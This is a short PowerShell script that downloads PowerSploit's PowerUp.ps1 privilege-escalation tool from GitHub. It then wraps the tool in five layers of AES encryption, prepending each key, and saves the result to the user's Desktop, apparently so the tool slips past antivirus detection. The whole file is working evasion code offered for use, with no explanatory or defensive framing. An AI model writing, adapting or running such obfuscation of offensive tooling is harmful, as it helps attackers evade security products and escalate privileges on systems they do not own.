#download source script file
$code = (New-Object Net.WebClient).downloadstring('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1 ');

for ($i = 1; $i -le 5; $i++) {
    #encode characters in bytes
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($code);

    #encrypt
    $aes = New-Object "System.Security.Cryptography.AesManaged";
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC;
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::Zeros;
    $aes.BlockSize = 128;
    $aes.KeySize = 256;
    $aes.GenerateKey();
    $key=[System.Convert]::ToBase64String($aes.Key);
    $key;
    $encryptor = $aes.CreateEncryptor();
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);

    #add the 256bit AES key of 44 characters(base64) at the start of the file 
    [byte[]] $fullData = $aes.IV + $encryptedData;
    $aes.Dispose();

    #convert to base64
    $encryptedString = [System.Convert]::ToBase64String($fullData);

    #add key that we will use use to decrypt in f ile 
    $withKey=$key+$encryptedString
    $code=$withkey
}

#save the file on the Desktop
[System.IO.File]::WriteAllText("$env:userprofile\desktop\file",$withKey)
